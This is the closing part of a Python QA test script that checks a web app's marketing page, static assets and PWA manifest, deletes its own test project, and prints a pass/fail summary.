check("Marketing page serves", r.status_code == 200)
mkting = r.text
check("Marketing mentions 75+ modules", "75+" in mkting)
check("Marketing mentions CCDC", "CCDC" in mkting)
check("Marketing mentions Flinks", "Flinks" in mkting)
check("Marketing mentions Stress Testing", "Stress Testing" in mkting)
check("Marketing mentions AI Bank Reconciliation", "Bank Reconciliation" in mkting or "bank feed" in mkting.lower())
check("Try Demo button links to /demo", 'href="/demo"' in mkting)
check("No tryDemo() JS inline calls", "tryDemo()" not in mkting or mkting.count("tryDemo()") == 0)

# ═══════════════════════════════════════════════════════════════════════════════
# 16. STATIC ASSETS & PWA
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 16. STATIC ASSETS & PWA ──────────────────────────────────────────────")

for asset, content_type in [
    ("/static/js/app-2.js", "javascript"),
    ("/static/js/alpine.min.js", "javascript"),
    ("/static/manifest.json", "json"),
    ("/static/favicon.svg", "svg"),
    ("/sw.js", "javascript"),
    ("/static/js/offline.js", "javascript"),
]:
    r = requests.get(f"{BASE}{asset}", timeout=10)
    check(f"Asset {asset} serves 200", r.status_code == 200)

r = requests.get(f"{BASE}/static/manifest.json", timeout=10)
if r.status_code == 200:
    manifest = r.json()
    check("PWA manifest has name", bool(manifest.get("name") or manifest.get("short_name")))
    check("PWA manifest has start_url", bool(manifest.get("start_url")))

r = requests.get(f"{BASE}/sw.js", timeout=10)
check("Service worker served from root scope", r.headers.get("Service-Worker-Allowed") == "/")

# ═══════════════════════════════════════════════════════════════════════════════
# 17. CLEANUP
# ═══════════════════════════════════════════════════════════════════════════════
print("\n── 17. CLEANUP ──────────────────────────────────────────────────────────")

if proj1_id and tok1:
    r, ok = delete(f"/api/projects/{proj1_id}", token=tok1)
    check("QA test project deleted", ok, r.text[:80] if not ok else "")

# ═══════════════════════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════════════════════
total = PASS + FAIL + WARN
print("\n" + "=" * 72)
print(f"  RESULTS: {PASS} PASS  |  {FAIL} FAIL  |  {WARN} WARN  |  {total} TOTAL")
print("=" * 72)

if FINDINGS:
    print("\n  FINDINGS REQUIRING ATTENTION:")
    for f in FINDINGS:
        print(f"  → {f}")

if FAIL == 0:
    print("\n  ALL TESTS PASSED ✓")
elif FAIL <= 3:
    print(f"\n  {FAIL} MINOR FAILURE(S) — review findings above")
else:
    print(f"\n  {FAIL} FAILURE(S) — investigate before release")

sys.exit(0 if FAIL == 0 else 1)
